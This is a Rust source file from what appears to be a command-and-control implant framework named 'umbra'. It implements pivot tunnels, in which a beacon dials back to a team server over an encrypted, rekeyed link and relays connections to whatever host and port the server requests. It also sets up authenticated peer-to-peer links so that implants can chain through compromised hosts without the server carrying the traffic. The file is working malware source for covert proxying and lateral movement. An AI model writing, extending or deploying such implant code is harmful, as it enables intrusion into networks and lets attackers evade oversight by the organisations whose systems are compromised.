//! Pivot tunnels.
//!
//! Two mechanisms live here:
//!
//! * **callback session** — the beacon dials the team server back and serves
//!   pivot streams over that connection. The server drives it: it asks for a
//!   connection to `host:port` and the beacon relays the bytes.
//! * **peer-to-peer link** — two beacons talk directly, encrypted with keys
//!   derived from the agent PSK and an X25519 exchange, so a third host can
//!   be reached through a chain of implants without the team server carrying
//!   the traffic.
//!
//! Both use the same frame vocabulary (`TUNNEL_OPEN`, `TUNNEL_DATA`,
//! `TUNNEL_CLOSE`), so the server side has one implementation to reason about.
//!
//! The link is owned by exactly one thread. Stream threads never touch the
//! session: they push frames into a queue and the owner sends them, which
//! keeps the frame order (and therefore the nonce order) intact.

use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream, ToSocketAddrs};
use std::sync::mpsc::{self, Receiver, Sender};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

use crate::crypto;
use crate::link;
use crate::session::Session;
use crate::sysinfo;
use crate::upk::{self, Value};
use crate::wire;

/// The payload size of one TUNNEL_DATA frame.
pub const CHUNK: usize = 32 * 1024;

/// How long a relayed connection may stay idle.
const IO_TIMEOUT: Duration = Duration::from_secs(120);

/// How long the owner waits for a frame before it drains the queues.
const POLL: Duration = Duration::from_millis(200);

/// A sealed link to the team server or to a peer beacon.
struct Link {
    session: Session,
    stream: TcpStream,
}

impl Link {
    fn send(&mut self, msg_type: u8, value: &Value) -> Result<(), String> {
        let frame = self
            .session
            .seal_value(msg_type, value)
            .map_err(|e| format!("seal: {e}"))?;
        self.stream
            .write_all(&frame)
            .map_err(|e| format!("write: {e}"))?;
        self.stream.flush().map_err(|e| format!("flush: {e}"))
    }

    fn open(&mut self, frame: &[u8]) -> Result<(u8, Value), String> {
        self.session
            .open_value(frame)
            .map_err(|e| format!("open: {e}"))
    }

    /// Rotate the keys of the link when it carried enough frames.
    ///
    /// The REKEY frame is sealed with the old keys and carries the seed:
    /// both ends derive the same keys from it, so the link keeps running
    /// on its own.
    fn maybe_rekey(&mut self) -> Result<(), String> {
        if !self.session.needs_rekey() {
            return Ok(());
        }
        let seed = crypto::random_bytes(32);
        let value = upk::map(vec![("seed", upk::bin(&seed))]);
        self.send(wire::MSG_REKEY, &value)?;
        self.session
            .apply_rekey(&seed)
            .map_err(|e| format!("rekey: {e}"))
    }
}

/// A buffered frame reader: the socket is read in chunks, and only whole
/// frames are handed on.
struct FrameReader {
    buf: Vec<u8>,
}

impl FrameReader {
    fn new() -> Self {
        FrameReader { buf: Vec::new() }
    }

    fn push(&mut self, data: &[u8]) {
        self.buf.extend_from_slice(data);
    }

    /// Return the next complete frame, if the buffer holds one.
    fn next(&mut self) -> Result<Option<Vec<u8>>, String> {
        if self.buf.len() < wire::PRELUDE_LEN {
            return Ok(None);
        }
        let header = wire::parse_prelude(&self.buf[..wire::PRELUDE_LEN])
            .map_err(|e| format!("parse prelude: {e}"))?;
        let total = wire::frame_len(header.length as usize);
        if self.buf.len() < total {
            return Ok(None);
        }
        let frame = self.buf[..total].to_vec();
        self.buf.drain(..total);
        Ok(Some(frame))
    }
}

/// The registry of live streams: stream id -> the channel that carries the
/// bytes the server sent for it.
type Registry = Arc<Mutex<HashMap<String, Sender<Vec<u8>>>>>;

/// Open a callback session with the team server and serve pivot streams.
///
/// The session ends when the link fails; the caller decides whether to retry.
pub fn open_callback(
    server: &str,
    psk: &[u8],
    agent_id: &str,
    stream_id: &str,
    verbose: bool,
) -> Result<(), String> {
    let suite = *crypto::supported_suites()
        .first()
        .ok_or("no AEAD suite compiled in")?;
    let stream = connect(server).map_err(|e| format!("connect {server}: {e}"))?;

    let mut meta = sysinfo::meta(crate::beacon::VERSION);
    if let Value::Map(ref mut map) = meta {
        map.insert("tunnel".to_string(), upk::s(stream_id));
    }
    let hs = {
        let mut channel = StreamChannel {
            stream: Some(stream),
        };
        link::client_handshake(
            &mut channel,
            psk,
            crypto::ROLE_AGENT,
            agent_id,
            suite,
            meta,
            &link::Hello {
                version: wire::HELLO_VERSION,
                caps: crate::task::capabilities().into_iter().map(upk::s).collect(),
                implant_version: crate::beacon::VERSION.to_string(),
                abi: wire::ABI_VERSION,
                platform: crate::beacon::hello_platform(),
            },
        )?
    };
    let stream = hs.stream.ok_or("the tunnel channel gave up the socket")?;
    let mut link = Link {
        session: hs.session,
        stream,
    };
    let ready = upk::map(vec![
        ("stream", upk::s(stream_id)),
        ("op", upk::s("ready")),
    ]);
    link.send(wire::MSG_TUNNEL_OPEN, &ready)?;
    if verbose {
        eprintln!("[umbra] tunnel callback open ({stream_id})");
    }
    serve(link, verbose)
}

/// A transport that carries umbra frames over a plain socket.
struct StreamChannel {
    stream: Option<TcpStream>,
}

impl crate::transport::Channel for StreamChannel {
    fn write_frame(&mut self, frame: &[u8]) -> std::io::Result<()> {
        let s = self.stream.as_mut().ok_or_else(|| {
            std::io::Error::new(std::io::ErrorKind::NotConnected, "channel closed")
        })?;
        s.write_all(frame)?;
        s.flush()
    }

    fn read_frame(&mut self) -> std::io::Result<Vec<u8>> {
        let s = self.stream.as_mut().ok_or_else(|| {
            std::io::Error::new(std::io::ErrorKind::NotConnected, "channel closed")
        })?;
        crate::wire::read_frame(s)
    }

    fn close(&mut self) {
        if let Some(s) = self.stream.take() {
            let _ = s.shutdown(std::net::Shutdown::Both);
        }
    }

    fn take_stream(&mut self) -> Option<TcpStream> {
        self.stream.take()
    }
}

/// Serve pivot streams over a link until it fails.
fn serve(mut link: Link, verbose: bool) -> Result<(), String> {
    let registry: Registry = Arc::new(Mutex::new(HashMap::new()));
    let (tx, rx): (Sender<(u8, Value)>, Receiver<(u8, Value)>) = mpsc::channel();
    let mut reader = FrameReader::new();
    let mut chunk = vec![0u8; 8192];

    loop {
        // Frames produced by the stream threads go out first: the server
        // waits for the stream result before it sends any payload.
        while let Ok((msg_type, value)) = rx.try_recv() {
            link.send(msg_type, &value)?;
        }
        link.maybe_rekey()?;

        let read = match link.stream.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => n,
            Err(ref e)
                if e.kind() == std::io::ErrorKind::WouldBlock
                    || e.kind() == std::io::ErrorKind::TimedOut =>
            {
                std::thread::sleep(POLL);
                continue;
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
            Err(e) => return Err(format!("read: {e}")),
        };
        reader.push(&chunk[..read]);
        while let Some(frame) = reader.next()? {
            let (msg_type, body) = link.open(&frame)?;
            match msg_type {
                wire::MSG_REKEY => {
                    // The other end rotates the keys: the seed travels
                    // with the frame.
                    let seed = body.bin_or("seed", &[]);
                    if seed.len() != 32 {
                        return Err("malformed REKEY seed".to_string());
                    }
                    link.session
                        .apply_rekey(&seed)
                        .map_err(|e| format!("rekey: {e}"))?;
                    if verbose {
                        eprintln!("[umbra] peer session rekeyed");
                    }
                }
                wire::MSG_TUNNEL_OPEN => {
                    let op = body.str_or("op", "");
                    if op != "open" {
                        continue;
                    }
                    let id = body.str_or("stream", "");
                    let host = body.str_or("host", "");
                    let port = body.u64_or("port", 0);
                    if id.is_empty() || host.is_empty() || port == 0 {
                        continue;
                    }
                    if verbose {
                        eprintln!("[umbra] tunnel stream {id} -> {host}:{port}");
                    }
                    let registry = Arc::clone(&registry);
                    let tx = tx.clone();
                    thread::spawn(move || {
                        serve_stream(id, host, port as u16, tx, registry, verbose);
                    });
                }
                wire::MSG_TUNNEL_DATA => {
                    let id = body.str_or("stream", "");
                    let data = body.bin_or("data", &[]);
                    let sink = {
                        let guard = match registry.lock() {
                            Ok(g) => g,
                            Err(_) => break,
                        };
                        guard.get(&id).cloned()
                    };
                    if let Some(sink) = sink {
                        if sink.send(data).is_err() {
                            // The stream thread is gone; drop the mapping.
                            if let Ok(mut guard) = registry.lock() {
                                guard.remove(&id);
                            }
                        }
                    }
                }
                wire::MSG_TUNNEL_CLOSE => {
                    let id = body.str_or("stream", "");
                    if let Ok(mut guard) = registry.lock() {
                        guard.remove(&id);
                    }
                }
                wire::MSG_PADDING => {}
                other => {
                    if verbose {
                        eprintln!(
                            "[umbra] unexpected frame on the tunnel: {}",
                            wire::type_name(other)
                        );
                    }
                }
            }
        }
    }
    Ok(())
}

/// Serve one pivot stream: connect to the target and relay both directions.
fn serve_stream(
    id: String,
    host: String,
    port: u16,
    tx: Sender<(u8, Value)>,
    registry: Registry,
    verbose: bool,
) {
    let target = match connect(&crate::config::host_port(&host, port)) {
        Ok(s) => s,
        Err(e) => {
            let value = upk::map(vec![
                ("stream", upk::s(&id)),
                ("op", upk::s("result")),
                ("ok", upk::bool_(false)),
                ("err", upk::s(&format!("connect {host}:{port}: {e}"))),
            ]);
            let _ = tx.send((wire::MSG_TUNNEL_OPEN, value));
            return;
        }
    };
    let mut target = target;
    let _ = target.set_read_timeout(Some(IO_TIMEOUT));
    let _ = target.set_write_timeout(Some(IO_TIMEOUT));

    // The socket is read by one thread and written by another, so the
    // reading thread gets its own handle of the same connection.
    let mut source = match target.try_clone() {
        Ok(s) => s,
        Err(e) => {
            let value = upk::map(vec![
                ("stream", upk::s(&id)),
                ("op", upk::s("result")),
                ("ok", upk::bool_(false)),
                ("err", upk::s(&format!("the stream could not be duplicated: {e}"))),
            ]);
            let _ = tx.send((wire::MSG_TUNNEL_OPEN, value));
            return;
        }
    };

    // The channel that carries the bytes the server sends for this stream.
    let (data_tx, data_rx): (Sender<Vec<u8>>, Receiver<Vec<u8>>) = mpsc::channel();
    if let Ok(mut guard) = registry.lock() {
        guard.insert(id.clone(), data_tx);
    }
    let value = upk::map(vec![
        ("stream", upk::s(&id)),
        ("op", upk::s("result")),
        ("ok", upk::bool_(true)),
    ]);
    if tx.send((wire::MSG_TUNNEL_OPEN, value)).is_err() {
        return;
    }

    // Target -> server.
    let up_tx = tx.clone();
    let up_id = id.clone();
    thread::spawn(move || {
        let mut buf = vec![0u8; CHUNK];
        loop {
            match source.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => {
                    let value = upk::map(vec![
                        ("stream", upk::s(&up_id)),
                        ("data", upk::bin(&buf[..n])),
                    ]);
                    if up_tx.send((wire::MSG_TUNNEL_DATA, value)).is_err() {
                        break;
                    }
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
                Err(_) => break,
            }
        }
    });

    // Server -> target.
    while let Ok(chunk) = data_rx.recv() {
        if target.write_all(&chunk).is_err() {
            break;
        }
        let _ = target.flush();
    }
    if verbose {
        eprintln!("[umbra] tunnel stream {id} closed");
    }
    if let Ok(mut guard) = registry.lock() {
        guard.remove(&id);
    }
}

/// Connect to a peer beacon and relay pivot frames over the link.
///
/// The peer link is encrypted with keys derived from the shared agent PSK and
/// an X25519 exchange, so two implants can talk without the team server.
pub fn connect_peer(
    host: &str,
    port: u16,
    psk: &[u8],
    agent_id: &str,
    verbose: bool,
) -> Result<(), String> {
    let mut stream = connect(&crate::config::host_port(host, port))?;
    let (secret, pubkey) = crypto::x25519_keypair();
    let nonce = crypto::random_bytes(16);
    let hello = upk::map(vec![
        ("id", upk::s(agent_id)),
        ("pub", upk::bin(&pubkey)),
        ("nonce", upk::bin(&nonce)),
        ("mac", upk::bin(&peer_hello_mac(psk, agent_id, &pubkey, &nonce))),
    ]);
    let payload = upk::encode(&hello).map_err(|e| format!("encode peer hello: {e}"))?;
    write_frame(&mut stream, &payload)?;

    let reply = read_frame(&mut stream)?;
    let ack = upk::decode_exact(&reply).map_err(|e| format!("decode peer ack: {e}"))?;
    let peer_id = ack.str_or("id", "");
    let peer_pub = ack.bin_or("pub", &[]);
    let peer_nonce = ack.bin_or("nonce", &[]);
    if peer_pub.len() != 32 || peer_nonce.len() != 16 {
        return Err("malformed peer hello".to_string());
    }
    // The tag of the answer covers the whole exchange: both identities,
    // both keys and both nonces.  A replayed answer belongs to another
    // link and does not fit.
    let want = peer_ack_mac(
        psk,
        agent_id,
        &pubkey,
        &nonce,
        &peer_id,
        &peer_pub,
        &peer_nonce,
    );
    if !link::ct_eq(&want, &ack.bin_or("mac", &[])) {
        return Err("peer authentication failed".to_string());
    }
    let shared = crypto::x25519_shared(&secret, &peer_pub)
        .map_err(|e| format!("x25519: {e}"))?;
    let mixed = crypto::hmac_sha256(psk, &shared);
    let (prk, km) = crypto::derive_session(&mixed, &nonce, &peer_nonce)
        .map_err(|e| format!("derive peer session: {e}"))?;
    let session = Session::new(wire::SUITE_AES256_GCM, km, false, false, Some(prk))
        .map_err(|e| format!("peer session: {e}"))?;
    serve(
        Link {
            session,
            stream,
        },
        verbose,
    )
}

/// The address of the peer listener, once it is bound.
///
/// The beacon reports it to the server: a pivot can be chained through
/// this host, and the server needs to know where to reach the peer
/// listener.
static PEER_ADDRESS: Mutex<String> = Mutex::new(String::new());

/// peer_address returns the address the peer listener waits on.
///
/// It is empty when the beacon serves no peer link.
pub fn peer_address() -> String {
    PEER_ADDRESS
        .lock()
        .map(|addr| addr.clone())
        .unwrap_or_default()
}

/// Bind the peer listener and report the address it waits on.
///
/// The address is what the beacon tells the server: a pivot can then be
/// chained through this host, and the server knows where to reach the
/// peer listener.
pub fn bind_peer(bind: &str) -> Result<(TcpListener, String), String> {
    let listener = TcpListener::bind(bind).map_err(|e| format!("bind {bind}: {e}"))?;
    let addr = listener
        .local_addr()
        .map(|a| a.to_string())
        .unwrap_or_else(|_| bind.to_string());
    if let Ok(mut current) = PEER_ADDRESS.lock() {
        *current = addr.clone();
    }
    Ok((listener, addr))
}

/// Serve peer connections on a bound listener.
///
/// Every connection is a peer link: it is authenticated with the agent key
/// and it carries the pivot streams of the host.
pub fn serve_peer_listener(listener: TcpListener, psk: Vec<u8>, agent_id: String, verbose: bool) {
    for incoming in listener.incoming() {
        let stream = match incoming {
            Ok(s) => s,
            Err(e) => {
                if verbose {
                    eprintln!("[umbra] p2p accept failed: {e}");
                }
                continue;
            }
        };
        let psk = psk.clone();
        let agent_id = agent_id.clone();
        let verbose = verbose;
        thread::spawn(move || {
            if let Err(e) = serve_peer(stream, &psk, &agent_id, verbose) {
                if verbose {
                    eprintln!("[umbra] p2p peer failed: {e}");
                }
            }
        });
    }
}

/// Listen for a peer connection and serve pivot streams over it.
pub fn listen_peer(
    bind: &str,
    psk: &[u8],
    agent_id: &str,
    verbose: bool,
) -> Result<(), String> {
    let (listener, addr) = bind_peer(bind)?;
    if verbose {
        eprintln!("[umbra] p2p listener on {addr}");
    }
    serve_peer_listener(listener, psk.to_vec(), agent_id.to_string(), verbose);
    Ok(())
}

/// Serve one peer connection.
fn serve_peer(
    mut stream: TcpStream,
    psk: &[u8],
    agent_id: &str,
    verbose: bool,
) -> Result<(), String> {
    let _ = stream.set_read_timeout(Some(IO_TIMEOUT));
    let _ = stream.set_write_timeout(Some(IO_TIMEOUT));
    let payload = read_frame(&mut stream)?;
    let hello = upk::decode_exact(&payload).map_err(|e| format!("decode peer hello: {e}"))?;
    let peer_id = hello.str_or("id", "");
    let peer_pub = hello.bin_or("pub", &[]);
    let peer_nonce = hello.bin_or("nonce", &[]);
    if peer_pub.len() != 32 || peer_nonce.len() != 16 {
        return Err("malformed peer hello".to_string());
    }
    // The tag of the hello is checked before the answer is made: the
    // responder does not answer a stranger.
    let want = peer_hello_mac(psk, &peer_id, &peer_pub, &peer_nonce);
    if !link::ct_eq(&want, &hello.bin_or("mac", &[])) {
        return Err("peer authentication failed".to_string());
    }
    let (secret, pubkey) = crypto::x25519_keypair();
    let nonce = crypto::random_bytes(16);
    let ack = upk::map(vec![
        ("id", upk::s(agent_id)),
        ("pub", upk::bin(&pubkey)),
        ("nonce", upk::bin(&nonce)),
        (
            "mac",
            upk::bin(&peer_ack_mac(
                psk,
                &peer_id,
                &peer_pub,
                &peer_nonce,
                agent_id,
                &pubkey,
                &nonce,
            )),
        ),
    ]);
    let payload = upk::encode(&ack).map_err(|e| format!("encode peer ack: {e}"))?;
    write_frame(&mut stream, &payload)?;
    let shared = crypto::x25519_shared(&secret, &peer_pub)
        .map_err(|e| format!("x25519: {e}"))?;
    let mixed = crypto::hmac_sha256(psk, &shared);
    let (prk, km) = crypto::derive_session(&mixed, &peer_nonce, &nonce)
        .map_err(|e| format!("derive peer session: {e}"))?;
    let session = Session::new(wire::SUITE_AES256_GCM, km, false, false, Some(prk))
        .map_err(|e| format!("peer session: {e}"))?;
    serve(
        Link {
            session,
            stream,
        },
        verbose,
    )
}

/// The authentication tag of a peer hello.
///
/// The tag covers the identity, the public key and the nonce of the sender:
/// only the holder of the key can produce it.
fn peer_hello_mac(psk: &[u8], ident: &str, pubkey: &[u8], nonce: &[u8]) -> [u8; 32] {
    let mut msg = Vec::with_capacity(64 + ident.len() + pubkey.len() + nonce.len());
    msg.extend_from_slice(b"umbra/v1/p2p/hello");
    msg.extend_from_slice(ident.as_bytes());
    msg.extend_from_slice(pubkey);
    msg.extend_from_slice(nonce);
    crypto::hmac_sha256(psk, &msg)
}

/// The authentication tag of a peer answer.
///
/// The tag covers both halves of the exchange: the hello of the initiator
/// and the answer of the responder.  The transcript cannot be rearranged,
/// and an answer cannot be replayed into another link.
fn peer_ack_mac(
    psk: &[u8],
    hello_id: &str,
    hello_pub: &[u8],
    hello_nonce: &[u8],
    ack_id: &str,
    ack_pub: &[u8],
    ack_nonce: &[u8],
) -> [u8; 32] {
    let mut msg = Vec::with_capacity(
        96 + hello_id.len()
            + ack_id.len()
            + hello_pub.len()
            + hello_nonce.len()
            + ack_pub.len()
            + ack_nonce.len(),
    );
    msg.extend_from_slice(b"umbra/v1/p2p/ack");
    msg.extend_from_slice(hello_id.as_bytes());
    msg.extend_from_slice(hello_pub);
    msg.extend_from_slice(hello_nonce);
    msg.extend_from_slice(ack_id.as_bytes());
    msg.extend_from_slice(ack_pub);
    msg.extend_from_slice(ack_nonce);
    crypto::hmac_sha256(psk, &msg)
}

/// Connect to a host:port with a timeout.
fn connect(addr: &str) -> Result<TcpStream, String> {
    let mut last = String::from("no address");
    for sa in addr.to_socket_addrs().map_err(|e| e.to_string())? {
        match TcpStream::connect_timeout(&sa, Duration::from_secs(10)) {
            Ok(s) => {
                let _ = s.set_nodelay(true);
                return Ok(s);
            }
            Err(e) => last = e.to_string(),
        }
    }
    Err(last)
}

/// Read one length-prefixed frame from a peer link.
fn read_frame(stream: &mut TcpStream) -> Result<Vec<u8>, String> {
    let mut len = [0u8; 4];
    stream
        .read_exact(&mut len)
        .map_err(|e| format!("read length: {e}"))?;
    let n = u32::from_be_bytes(len) as usize;
    if n == 0 || n > 1 << 20 {
        return Err("peer frame length out of range".to_string());
    }
    let mut buf = vec![0u8; n];
    stream
        .read_exact(&mut buf)
        .map_err(|e| format!("read payload: {e}"))?;
    Ok(buf)
}

/// Write one length-prefixed frame to a peer link.
fn write_frame(stream: &mut TcpStream, payload: &[u8]) -> Result<(), String> {
    stream
        .write_all(&(payload.len() as u32).to_be_bytes())
        .map_err(|e| format!("write length: {e}"))?;
    stream
        .write_all(payload)
        .map_err(|e| format!("write payload: {e}"))?;
    stream.flush().map_err(|e| format!("flush: {e}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn peer_mac_is_keyed() {
        let a = peer_hello_mac(b"psk", "agent", b"pub", b"nonce");
        let b = peer_hello_mac(b"other", "agent", b"pub", b"nonce");
        assert_ne!(a, b);
        let c = peer_hello_mac(b"psk", "agent", b"pub", b"nonce");
        assert_eq!(a, c);
    }

    #[test]
    fn the_answer_covers_the_whole_exchange() {
        let a = peer_ack_mac(b"psk", "one", b"pub1", b"nonce1", "two", b"pub2", b"nonce2");
        // The same key on the other side of the exchange is a different
        // exchange: the tag does not fit.
        let b = peer_ack_mac(b"psk", "two", b"pub2", b"nonce2", "one", b"pub1", b"nonce1");
        assert_ne!(a, b);
        // Another key does not fit either.
        let c = peer_ack_mac(b"other", "one", b"pub1", b"nonce1", "two", b"pub2", b"nonce2");
        assert_ne!(a, c);
    }

    #[test]
    fn frame_reader_waits_for_a_whole_frame() {
        let mut reader = FrameReader::new();
        reader.push(&[0x55, 0x43, 0x01]);
        assert!(reader.next().unwrap().is_none());
        reader.push(&[0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
        // The prelude is complete but the body is not: still nothing.
        assert!(reader.next().unwrap().is_none());
    }
}
